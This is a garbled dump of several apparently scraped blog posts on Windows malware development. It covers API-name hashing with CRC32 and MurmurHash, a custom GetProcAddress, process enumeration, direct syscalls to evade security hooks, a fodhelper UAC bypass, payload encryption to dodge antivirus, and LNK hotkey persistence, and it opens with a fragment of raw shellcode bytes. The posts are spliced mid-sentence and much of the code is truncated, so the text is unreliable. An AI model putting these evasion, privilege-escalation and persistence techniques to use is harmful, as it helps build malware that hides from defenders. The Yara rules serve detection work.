\"\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\"\n  \"\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\"\n       "title": "Malware analysis: part 7. Yara rule example for CRC32. CRC32 in REvil ransomware",
      "ref": "2023-02-02-malware-analysis-7",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nThis post is the result of my own research on Yara rule for `CRC32` hashing. How to use it for malware analysis in practice.    \n\nAt first I wanted to focus on the WinAPI hashing method by `CRC32` at malware development. But then this article would differ from [this one](/tutorial/2022/03/22/simple-av-evasion-5.html) only in the hashing algorithm. Then I decided to see how to create a Yara rule which indicate using this algorithm at malware samples. I also consider the implementation of this algorithm in the REvil ransomware.      \n\n### CRC32\n\nIn short, this is one of the checksum calculation methods. CRC32 (Cyclic Redundancy Check 32) is a type of hashing algorithm used to generate a small, fixed-size checksum value from any data. It is used to detect errors in data stored in memory or transmitted over a network or other communication channel. The checksum is calculated using a polynomial function and is often expressed as a `32-bit` hexadecimal number.      \n\nIn fact, CRC is not a sum, but the result of dividing a certain amount of information (information message) by a constant, or rather, the remainder of dividing a message by a constant.     \n\nAlgorithm of the simplest calculation method is:    \n\n1. initialize a remainder `r` to be `0xFFFFFFFF`     \n2. for each byte in the message, do the following:     \n   a. divide the current remainder `r` by the polynomial `x^8 + x^7 + x^6 + x^4 + x^2 + 1 (0xEDB88320)`      \n   b. store the remainder in an `8-bit` register.     \n   c. `XOR` the `8-bit` register with the next byte of the message.     \n   d. replace the current remainder with the `8-bit` register     \n3. after the last byte of the message has been processed, the final remainder is the CRC result.     \n\n### practical example\n\nAnd, where can this be applied in the malware development? This algorithm is often used for [hashing function names](/tutorial/2022/03/22/simple-av-evasion-5.html).     \n\nI used my [example](https://github.com/cocomelonc/meow/tree/master/2022-03-22-malware-av-evasion-5) from the previous article and just replaced the hashing algorithm to `CRC32`:     \n\n```cpp\n/*\n * hack.cpp - hashing Win32API functions via CRC32. C++ implementation\n * @cocomelonc\n * https://cocomelonc.github.io/malware/2023/01/27/malware-analysis-7.html\n*/\n#include \n#include \n\ntypedef UINT(CALLBACK* fnMessageBoxA)(\n  HWND   hWnd,\n  LPCSTR lpText,\n  LPCSTR lpCaption,\n  UINT   uType\n);\n\nunsigned int crc32(const char *data, size_t len) {\n  unsigned int crc_table[256], crc;\n\n  for (int i = 0; i > 1) ^ (crc & 1 ? 0xEDB88320 : 0);\n    crc_table[i] = crc;\n  };\n\n  crc = 0xFFFFFFFF;\n  while (len--) crc = (crc >> 8) ^ crc_table[(crc ^ *data++) & 0xFF];\n  return crc ^ 0xFFFFFFFF;\n}\n\nstatic LPVOID getAPIAddr(HMODULE h, unsigned int myHash) {\n  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;\n  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);\n  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(\n    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);\n  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);\n  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);\n\n  for (DWORD i = 0; i AddressOfFunctions; i++) {\n    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);\n\n    if (crc32(pFuncName, strlen(pFuncName)) == myHash) {\n      printf(\"successfully found! %s - %x\\n\", pFuncName, myHash);\n      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);\n    }\n  }\n  return nullptr;\n}\n\nint main() {\n  HMODULE mod = LoadLibrary(\"user32.dll\");\n  //LPVOID addr = getAPIAddr(mod, 0x572d5d8e);\n  LPVOID addr = getAPIAddr(mod, 1462590862);\n  printf(\"0x%p\\n\", addr);\n  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)addr;\n  myMessageBoxA(NULL, \"Meow-meow!\",\"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAs you can see, I just used this constant `0xEDB88320` and also hardcoded `MessageBoxA` string:     \n\n```python\nimport zlib\n\n# crc32\ndef crc32(data):\n    hash = zlib.crc32(data)\n    print (\"0x%08x\" % hash)\n    print (hash)\n    return hash\n\ncrc32(b\"MessageBoxA\")\n```\n\n    \n\n### yara rule\n\nSo in the simplest implementation, the Yara rule will look like this:     \n\n```yaml\nrule crc32_hash\n{\n  meta:\n    author = \"cocomelonc\"\n    description = \"crc32 constants\"\n  strings:\n    $c = { 2083B8ED }\n  condition:\n    $c\n}\n```\n\nAs you can see, we just add algorithm's constant for identity:    \n\n```bash\nhexdump -C ./hack.exe | grep \"20 83 b8 ed\"\n```\n\n    \n\nLet's check it:     \n\n```bash\nyara -w ./crc32.yar ./hack.exe\n```\n\n    \n\nDespite the fact that this rule may provide a large number of false-positive matches, it is useful to be aware that a sample may have implemented `CRC32`, since this can speed up malware sample analysis.     \n\n### demo\n\nFirst of all, compile our \"malware\":    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nRun it at victim's machine (`Windows 10 x64`):     \n\n```powershell\n.\\hack.exe\n```\n\n    \n\n    \n\nAs you can see, everything is worked perfectly!       "title": "Malware analysis: part 8. Yara rule example for MurmurHash2. MurmurHash2 in Conti ransomware",
      "ref": "2023-02-10-malware-analysis-8",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nThis post is the result of my own research on Yara rule for `Murmurhash2` hashing. How to use it for malware analysis in practice.    \n\n### MurmurHash\n\n*MurmurHash2A* is a non-cryptographic hash function optimized for performance and speed. It divides the input data into `4-byte` blocks, applies bitwise operations and XORs to each block, and then uses a finalizer to produce the final hash result.      \n\nHere's a high-level overview of the algorithm:\n\n1. divide the input data into `4-byte` blocks.      \n2. initialize a seed value, which is used to influence the final hash value.       \n3. for each block, perform bitwise operations such as XORs, multiplications, and bit rotations to produce a new intermediate value, the calculation of the intermediate value includes the constant value `0x5bd1e995`.      \n4. XOR the intermediate value with the seed.        \n5. Repeat steps 3 and 4 for each block.         \n6. Use a finalizer to mix the intermediate value and produce the final hash value.       \n\nSo as you can see, MurmurHash2A with a constant value of `0x5bd1e995` is a variation of the MurmurHash2A algorithm. The constant value is incorporated into the calculation.       \n\n> The MurmurHash2 algorithm was created [by Austin Appleby](https://github.com/aappleby/smhasher/blob/master/src/MurmurHash3.cpp).        \n\n### practical example\n\nThis algorithm is also often used for [hashing function names](/tutorial/2022/03/22/simple-av-evasion-5.html).     \nFor example, if you look at the source code of the [Conti ransomware leak](/investigation/2022/03/27/malw-inv-conti-1.html), you can see `Murmurhash2A` function.      \n\nIt might look something like this (`hack.cpp`):      \n\n```cpp\n/*\n * hack.cpp - hashing Win32API functions via MurmurHash2A. Here is a step by step flow of the algorithm:\n\n- *Initialization:* - Three `19-bit` registers `R1`, `R2`, and `R3` are loaded with a `64-bit` key.\nAn additional `22-bit` frame counter register is used to ensure that the key stream is different for each frame.\nThe three registers are filled with the key and frame counter using a bit-by-bit loading algorithm. The initial state of the registers is completely determined by the key and frame counter.      \n\n- *Clocking:* - In each clock cycle, the three registers are shifted one bit to the left. The output of several taps on the registers are `XOR`ed together to form a feedback bit. The feedback bit is then shifted into the most significant bit of `R1`. `R2` and `R3` are shifted to the left by one bit, and the least significant bits of `R1` and `R2` are shifted into `R2` and `R3` respectively.      \n\n- *Key generation:* - `A8` and `A5` algorithms use different clocking sequences, but the key generation process is similar. In each clock cycle, a bit is generated for the key stream by `XOR`ing together bits from the three registers and the feedback bit. The generated bit is added to the key stream. The key stream is `XOR`ed with the plaintext to produce the ciphertext.      \n\n- *Decryption:* - Decryption is simply the reverse process of encryption. The ciphertext is `XOR`ed with the key stream to produce the plaintext.       \n\nNote: This is a high-level overview of the `A5` algorithm. The actual implementation may differ depending on the specific use case.       \n\n### practical example\n\nI create the simplest implementation:     \n\n```cpp\nvoid a5_1_encrypt(unsigned char *key, int key_len, unsigned char *msg, int msg_len, unsigned char *out) {\n  // initialization\n  unsigned int R1 = 0, R2 = 0, R3 = 0;\n  for (int i = 0; i > (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);\n    R1 = (R1 > 8) & 1);\n    R3 = (R3 > 10) & 1);\n  }\n  // encryption\n  for (int i = 0; i > 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);\n    unsigned char key_byte = 0;\n    for (int j = 0; j > 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;\n      key_byte |= bit > 8) & 1);\n      R3 = (R3 > 10) & 1);\n    }\n    out[i] = msg[i] ^ key_byte;\n  }\n}\n```\n\n`A5/1` algorithm implementation in the provided function `a5_1_encrypt`:     \n- The function takes four input arguments: `key`, `key_len`, `msg`, and `msg_len`, which represent the encryption key, the length of the key, the plaintext message to be encrypted, and the length of the message, respectively. It also takes an output argument out, which will hold the encrypted message.       \n- The function initializes three 32-bit registers `R1`, `R2`, and `R3` to `0`.       \n- The function loops through the first 64 bits of the encryption key and uses them to initialize the three registers as follows:      \n    For each bit in the key, the function calculates the feedback bit as the `XOR` of the key bit, the `18th` bit of `R1`, the `21st` bit of `R2`, and the `22nd` bit of `R3`.        \n    The function shifts `R1`, `R2`, and `R3` to the left by one bit and sets the least significant bit of `R1` to the feedback bit.             \n- The function loops through the plaintext message and encrypts each byte as follows:\n    For each byte of the message, the function calculates a feedback bit as the `XOR` of the `8th` bit of `R1`, the `10th` bit of `R2`, and the `10th` bit of `R3`.      \n    The function generates a byte of the key by `XOR`ing eight feedback bits with the corresponding bits of `R1`, `R2`, and `R3`.       \n    The function `XOR`s the byte of the message with the corresponding byte of the key to produce the encrypted byte.      \n    The function shifts `R1`, `R2`, and `R3` to the left by eight, ten, and ten bits, respectively, and sets the least significant bit of `R1` to the feedback bit.        \n- The function stores the encrypted message in the `out` buffer and returns.       \n\nI decided to encrypt the payload and decrypt it and see what happens: how many AV engines detect it as malicious in virustotal and how much Shannon's entropy will increase.    \n\nFor decrypt using this code:     \n\n```cpp\nvoid a5_1_decrypt(unsigned char *key, int key_len, unsigned char *cipher, int cipher_len, unsigned char *out) {\n  // initialization\n  unsigned int R1 = 0, R2 = 0, R3 = 0;\n  for (int i = 0; This function is useful when you want to load a function from a `DLL` at runtime, which is also known as dynamic linking or runtime linking:      \n\n```cpp\nFARPROC GetProcAddress(\n  HMODULE hModule,\n  LPCSTR  lpProcName\n);\n```\n\n- `hModule` - A handle to the DLL module that contains the function or variable. The LoadLibrary or LoadLibraryEx function returns this handle.      \n- `lpProcName` - The function or variable name as a null-terminated string, or the function's ordinal value. If this parameter is an ordinal value, it must be in the low-order word, and the high-order word must be zero.        \n\nIf the function succeeds, the return value is the address of the exported function or variable, if the function fails, the return value is `NULL`.           \n\n### practical example. custom implementation of `GetProcAddress`\n\nLike a [previous post](/malware/2023/04/08/malware-av-evasion-15.html) creating my simplest implementation of `GetProcAddress` using Process Environment Block (PEB) also can help avoid antivirus (AV) detection in certain scenarios.     \n\n```cpp\nFARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {\n  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;\n  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);\n  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + \n  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);\n  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);\n  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);\n\n  for (DWORD i = 0; i NumberOfNames; ++i) {\n    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {\n      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);\n    }\n  }\n\n  return NULL;\n}\n```\n\nHere's a step-by-step explanation of this code:       \n\n- get `DOS` and `NT` headers: Cast the base address of the module (`hModule`) to a `PIMAGE_DOS_HEADER` pointer and use it to locate the `PIMAGE_NT_HEADERS` structure by adding the `e_lfanew` field to the base address.       \n- locate the export directory: Use the `OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress` field from the `PIMAGE_NT_HEADERS` structure to find the `PIMAGE_EXPORT_DIRECTORY` structure.     \n- get pointers to export tables: Obtain pointers to the `AddressOfFunctions`, `AddressOfNameOrdinals`, and `AddressOfNames` tables using the respective fields of the `PIMAGE_EXPORT_DIRECTORY` structure and the base address of the module.      \n- iterate through the names: Loop through the `AddressOfNames` table up to `NumberOfNames` times, and compare each function name with the target function name (`lpProcName`) using `strcmp`.      \n- find the function address: If the function name matches, [find the function's ordinal](/tutorial/2022/03/18/simple-malware-av-evasion-4.html) by indexing the `AddressOfNameOrdinals` table, and use the ordinal to index the `AddressOfFunctions` table. Calculate the absolute function address by adding the module's base address to the relative virtual address (`RVA`) of the function.      \n\n### AV evasion \"malware\"\n\nOk, what about the \"malware\" example?       "title": "Malware development trick - part 30: Find PID via NtGetNextProcess. Simple C++ example.",
      "ref": "2023-05-26-malware-tricks-30",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nToday, I just want to focus my research on another malware development trick: enum processes and find PID via `NtGetNextProcess`. It is a common technique that can be used by malware for AV evasion also.     \n\n### what's the trick?\n\nWe just simply utilize additional undocumented features. `NtGetNextProcess` is a system call made available by the kernel that retrieves the next process. But what does next mean? If you're familiar with Windows internals, you know that process objects are linked together in the kernel's massive linked list. Therefore, this system call takes the handle to a process object and locates the next process in the chain that the current user can access.       \n\n### practical example\n\nEverything is pretty simple:      \n\n```cpp\nint findMyProc(const char * procname) {\n  int pid = 0;\n  HANDLE current = NULL;\n  char procName[MAX_PATH];\n\n  // resolve function address\n  fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess) GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n  // loop through all processes\n  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n    GetProcessImageFileNameA(current, procName, MAX_PATH);\n    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n      pid = GetProcessId(current);\n      break;\n    }\n  }\n\n  return pid;\n}\n```\n\nThis function scans all running processes in a Windows system and returns the Process ID (PID) of a process that matches the provided name. A `while` loop is started which continues until `myNtGetNextProcess` returns a non-zero value, indicating that there are no more processes. The handle of the next process is obtained by `myNtGetNextProcess` and stored in `current`. For each process, `GetProcessImageFileNameA` is used to get the image file name (the executable file of the process) and stores it in `procName`. If the base name of `procName` (obtained using `PathFindFileName`) matches `procname` (comparison is case-insensitive due to `lstrcmpiA`), the process ID of current is obtained.      \n\nSo, full source code is looks like this (`hack.cpp`):      \n\n```cpp\n/*\n * hack.cpp - find process ID by NtGetNextProcess. C++ implementation\n * @cocomelonc\n * https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html\n*/\n#include \n#include \n#include \n#include \n#include \n\n#pragma comment(lib, \"ntdll.lib\")\n#pragma comment(lib, \"shlwapi.lib\")\n\ntypedef NTSTATUS (NTAPI * fNtGetNextProcess)(\n  _In_ HANDLE ProcessHandle,\n  _In_ ACCESS_MASK DesiredAccess,\n  _In_ ULONG HandleAttributes,\n  _In_ ULONG Flags,\n  _Out_ PHANDLE NewProcessHandle\n);\n\nint findMyProc(const char * procname) {\n  int pid = 0;\n  HANDLE current = NULL;\n  char procName[MAX_PATH];\n\n  // resolve function address\n  fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess) GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n  // loop through all processes\n  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n    GetProcessImageFileNameA(current, procName, MAX_PATH);\n    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n      pid = GetProcessId(current);\n      break;\n    }\n  }\n\n  return pid;\n}\n\nint main(int argc, char* argv[]) {\n  int pid = 0; // process ID\n  pid = findMyProc(argv[1]);\n  printf(\"%s%d\\n\", pid > 0 ? \"process found at pid = \" : \"process not found. pid = \", pid);\n  return 0;\n}\n```\n\n### demo\n\nOk, let's go to look this trick in action.     \n\nCompile it (`hack.cpp`):      \n\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwapi\n```\n\n      \n\nThen, just run it at the victim's machine (`Windows 10 22H2 x64` in my case):      \n\n```powershell\n.\\hack.exe \n```\n\n      \n\nAs you can see, it's worked perfectly, as expected :) =^..^=    \n\n### practical example 2. find and inject\n\nLet's go to another example with malicious logic.       "title": "Malware development trick - part 31: Run shellcode via SetTimer. Simple C++ example.",
      "ref": "2023-06-04-malware-tricks-31",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nThis article is the result of my own research into the next interesting trick: run shellcode via `SetTimer` function.      \n\n### SetTimer\n\nThe `SetTimer` function is a part of the Windows API. It is used to create a timer with a specified time-out value.     \n\nHere is its basic syntax:    \n\n```cpp\nUINT_PTR SetTimer(\n  HWND      hWnd,\n  UINT_PTR  nIDEvent,\n  UINT      uElapse,\n  TIMERPROC lpTimerFunc\n);\n```\n\nWhere:\n\n- `hWnd`: A handle to the window to be associated with the timer. This window must be owned by the calling thread. If a `NULL` value for `hWnd` is passed in along with an `nIDEvent` of an existing timer, that old timer will be replaced by the new one.      \n- `nIDEvent`: A nonzero timer identifier. If the hWnd parameter is `NULL`, and the `nIDEvent` does not match an existing timer then it is ignored and a new timer ID is generated. If the `hWnd` is not `NULL` and the window specified by hWnd already has a timer with the value nIDEvent, then the existing timer is replaced by the new timer. When `SetTimer` replaces a timer, the timer is reset.     \n- `uElapse`: The time-out value, in milliseconds.      \n- `lpTimerFunc`: A pointer to the function to be notified when the time-out value elapses. If this parameter is `NULL`, the system posts a `WM_TIMER` message to the application queue. This message is processed by the window procedure.      \n\n### practical example\n\nSo, what's the trick? Recall that syscalls are the APIs responsible for executing actions when a WinAPI function is invoked. `NtAllocateVirtualMemory` is initiated, for instance, when the `VirtualAlloc` or `VirtualAllocEx` WinAPIs functions are called. This syscall then transfers the user-supplied parameters from the preceding function call to the Windows kernel, executes the requested action, and returns the result to the program.     \n\nAll syscalls return an NTSTATUS Value that indicates the error code. STATUS_SUCCESS (zero) is returned if the syscall succeeds in performing the operation.\n\nThe majority of syscalls are not documented by Microsoft, so syscall modules will refer to the documentation shown below:    \n\n[ReactOS NTDLL reference](https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html)        \n\nThe majority of syscalls are exported from the `ntdll.dll` DLL.      \n\nYou can find windows syscall table at [https://github.com/j00ru/windows-syscalls/](https://github.com/j00ru/windows-syscalls/):      \n\n      \n\n### what's the trick?\n\nUsing system calls provides low-level access to the operating system, which can be advantageous when executing operations that are unavailable or more difficult to perform with standard WinAPIs.         \n\nMoreover, syscalls can be utilized to circumvent host-based security solutions.      \n\n### syscall ID\n\nEvery syscall has a special syscall number, which is known as syscall ID or system service number. This capability can provide vital insights into program execution and possible security threats.      \n\nMoreover, these security solutions have the authority to examine any memory area designated as executable, scanning for specific patterns or signatures. These hooks, installed in user mode, are typically set up prior to the execution of the system call instruction, which signifies the final stage of a user mode system call function.      \n\nFor example, `NtAllocateVirtualMemory` is a system call used to allocate virtual memory. When an application calls `NtAllocateVirtualMemory`, it is asking the operating system to reserve a block of virtual memory for its use.     \n\nSecurity solutions can place a hook on `NtAllocateVirtualMemory` to monitor how applications are using memory. This can help the security solution detect malicious activities. For example, if an application is allocating a very large amount of memory or if it's allocating memory in a suspicious manner, that could be a sign of a memory-based attack or a memory leak.       \n\nBy hooking into `NtAllocateVirtualMemory`, the security solution can inspect these activities in real-time and potentially stop malicious activities before they cause damage. The ability to analyze and interpret the behavior of such function calls is an essential aspect of many host-based security solutions.      \n\n### direct syscalls\n\nUsing syscalls directly is one method of bypassing userland hooks. The most common misuses of key values involve the manipulation of `windir` and `systemroot` environment variables, as well as shell open commands for particular file extensions (depending on the program that is being targeted):      \n\n- `HKCU\\\\Software\\\\Classes\\\\\\shell\\\\open\\command (Default or DelegateExecute values)`     \n- `HKCU\\\\Environment\\\\windir`     \n- `HKCU\\\\Environment\\\\systemroot`        \n\n### fodhelper.exe\n\n`fodhelper.exe` was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It's location is: `C:\\Windows\\System32\\fodhelper.exe` and it is signed by Microsoft:      \n\n      \n\nWhen `fodhelper.exe` is started, process monitor begins capturing the process and discloses (among other things) all registry and filesystem read/write operations.  The read registry accesses are one of the most intriguing activities, despite the fact that some specific keys or values are not discovered. Because we do not require special permissions to modify entries, `HKEY_CURRENT_USER` registry keys are particularly useful for testing how a program's behavior may change after the creation of a new registry key.       \n\n`fodhelper.exe`, searches for `HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command`. This key does not exist by default in Windows 10:       \n\n      \n\nSo, when malware launches `fodhelper` (as we know, a Windows binary that permits elevation without requiring a UAC prompt) as a Medium integrity process, Windows automatically elevates `fodhelper` from a Medium to a High integrity process.       "title": "Malware AV/VM evasion - part 18: encrypt/decrypt payload via modular multiplication-based block cipher. Simple C++ example.",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nThis post is the result of my own research on try to evasion AV engines via encrypting payload with another logic: modular multiplication-based cipher. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.     \n\n### modular multiplication-based block cipher\n\nA modular multiplication-based block cipher is a type of symmetric key block cipher that uses the mathematical operation of modular multiplication as its primary method of encryption.       \n\nModular multiplication is an operation that is easy to compute in one direction but hard to reverse without knowing a specific secret value, making it suitable for encryption purposes. In a modular multiplication-based block cipher, the plaintext is broken up into blocks of a fixed size and each block is then encrypted using a modular multiplication operation.       \n\nThe modular multiplication operation consists of two parts: a multiplier and a modulus. The multiplier is a number that the plaintext is multiplied by, and the modulus is the number that the resulting product is divided by to obtain the remainder. This remainder is the ciphertext block.       \n\nThe decryption process involves an inverse modular multiplication operation. Knowing the modulus and the multiplier allows the original plaintext block to be recovered from the ciphertext block.       \n\nThe security of a modular multiplication-based block cipher relies on choosing a multiplier that has certain mathematical properties relative to the modulus. For example, the multiplier and the modulus should be coprime, meaning that they share no common divisors other than `1`.       \n\nThis type of block cipher is fairly simple to implement and understand, and it can provide a reasonable level of security if the multiplier and modulus are chosen carefully. However, it is not as secure as more complex block ciphers such as AES and is typically not used in high-security applications.      \n\n### practical example\n\nDesigning and implementing a secure modular multiplication-based block cipher from scratch is a complex task that requires advanced knowledge in cryptography. It was developed by the National Security Agency (NSA) in the early 1990s and was initially intended for use in various secure communications applications.     \n\n### practical example     \n\nSkipjack operates on `64-bit` blocks of data and uses an `80-bit` key, divided into eight `10-bit` words. The algorithm employs a series of permutations, substitutions, and key mixing steps to achieve its encryption and decryption. Skipjack operates on a Feistel network structure, where the data block is split into two halves and processed through multiple rounds.    \n\nThe algorithm's basic structure involves:    \nA key setup phase to generate round subkeys from the user-provided key.    \nA series of `32` rounds in which the data block undergoes various transformations using the round subkeys.    \nThe final output is the result of the last round, which serves as the encrypted or decrypted data.     \n\nIn Skipjack, the core operation is a key-dependent permutation called *\"G.\"* This permutation operates on `16-bit` words (two bytes) and is used in the encryption and decryption processes. The G permutation is a Feistel network, meaning it uses a combination of substitutions, permutations, and key mixing to produce its output:     \n\n```cpp\n/**\n * The key-dependent permutation G on V^16 is a four-round Feistel network.\n * The round function is a fixed unsigned char-substitution table (permutation on V^8),\n * the F-table. It uses an automatic key schedule to encrypt and decrypt data. Operating in rounds, it generates an auto-key sequence to scramble data. Its simplicity makes it easy to implement, though not suitable for high-security applications due to known vulnerabilities. WAKE encryption offers historical significance as one of the early cryptographic algorithms for lightweight applications.      \n\n### practical example\n\nHere's a step-by-step overview of implementing the WAKE encryption algorithm with `32` rounds:\n\n*Key Scheduling:* - Start with a `32-bit` encryption key. Initialize a schedule array to store round keys. The first key is the user-provided key, and the remaining keys are generated using a simple arithmetic operation and a multiplier.     \n\n```cpp\nvoid key_schedule(uint32_t key, uint32_t schedule[ROUNDS]) {\n  schedule[0] = key;\n  for (int i = 1; i > 29);\n    }\n  }\n}\n```\n*Decryption:* - To decrypt, you need the same key schedule. Developed by David Wheeler and Roger Needham, XTEA operates on `64-bit` blocks with a `128-bit` key and typically employs `64` rounds for encryption and decryption. The algorithm incorporates a [Feistel network](https://en.wikipedia.org/wiki/Feistel_cipher) structure, utilizing a complex key schedule and a series of bitwise operations, shifts, and additions to iteratively transform plaintext into ciphertext.    \n\nXTEA addresses certain vulnerabilities identified in TEA, providing improved resistance against cryptanalysis while maintaining simplicity and efficiency. Notably, XTEA is free from patent restrictions, contributing to its widespread use in various applications where lightweight encryption is essential, such as embedded systems and resource-constrained environments.    \n\n### pracical example\n\nAs usually, let's implement this cipher in practice.    \n\nFor simplicity I decided to implement `32`-rounds:    \n\n```cpp\n#define KEY_SIZE 16\n#define v0) ^ (sum + key[(sum >> 11) & 3]);\n  }\n\n  data[0] = v0;\n  data[1] = v1;\n}\n\nvoid xtea_decrypt(unsigned int *data, unsigned int *key) {\n  unsigned int v0 = data[0], v1 = data[1];\n  unsigned 3]);\n  }\n\n  data[0] = v0;\n  data[1] = v1;\n}\n```\n\nAs you can see, it's implemented with the same `delta = 0x9e3779b9`.     \n\nFor simplicity, I used running shellcode [via       "title": "Malware development: persistence - part 23. LNK files. Simple Powershell example.",
      "ref": "2023-12-10-malware-pers-23",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nThis post is based on my own research into one of the more interesting malware persistence tricks: via Windows LNK files.     \n\n### LNK\n\nAccording to [Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943), an `LNK` file serves as a shortcut or \"link\" in Windows, providing a reference to an original file, folder, or application. For regular users, these files serve a meaningful purpose, facilitating file organization and workspace decluttering. However, from an attacker's perspective, `LNK` files take on a different significance. They have been exploited in various documented attacks by APT groups and, to my knowledge, remain a viable option for activities such as phishing, establishing persistence, executing payloads.     \n\nDo you know that Windows shortcuts can be registered using a shortcut key in terms of execution? This is the main trick for malware persistence in this case.    \n\n### practical example\n\nLet's say we have a \"malware\". As usually, `meow-meow` messagebox application `hack.c`:    \n\n```cpp\n/*\nhack.c\nevil app for windows persistence\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2023/12/10/malware-pers-23.html\n*/\n#include \n#pragma comment (lib, \"user32.lib\")\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n  MessageBox(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAnd then, just create powershell script for create `LNK` file with the following properties:     \n\n```powershell\n# Define the path for the shortcut on the desktop\n$shortcutPath = \"$([Environment]::GetFolderPath('Desktop'))\\Meow.lnk\"\n\n# Create a WScript Shell object\n$wshell = New-Object -ComObject Wscript.Shell\n\n# Create a shortcut object\n$shortcut = $wshell.CreateShortcut($shortcutPath)\n\n# Set the icon location for the shortcut\n$shortcut.IconLocation = \"C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe\"\n\n# Set the target path and arguments for the shortcut\n$shortcut.TargetPath = \"Z:\\2023-12-10-malware-pers-23\\hack.exe\"\n$shortcut.Arguments = \"\"\n\n# Set the working directory for the shortcut\n$shortcut.WorkingDirectory = \"Z:\\2023-12-10-malware-pers-23\"\n\n# Set a hotkey for the shortcut (e.g., CTRL+W)\n$shortcut.HotKey = \"CTRL+W\"\n\n# Set a description for the shortcut\n$shortcut.Description = \"Not malicious, meow-meow malware\"\n\n# Set the window style for the shortcut (7 = Minimized window)\n$shortcut.WindowStyle = 7\n\n# Save the shortcut\n$shortcut.Save()\n\n# Optionally make the link invisible by adding 'Hidden' attribute\n# (Get-Item $shortcutPath).Attributes += 'Hidden'\n```\n\nAs you can see, the logic is pretty simple. We simply create a shortcut on the desktop that has a hotkey specified: `CTRL+W`. Of course, in real attack scenarios it could be something like `CTRL+C`, `CTRL+V` or `CTRL+P`, etc.    \n\nFor example, if you create a shortcut for `Paint`, it does not have any hotkey specified:    \n\n    \n\n> Explorer restricts shortcut support to commands beginning with CTRL+ALT. Additional sequences must be set programmatically through COM.    \n\n### demo\n\nLet's go to see everything in action.       "ref": "2024-01-16-malware-cryptography-24",
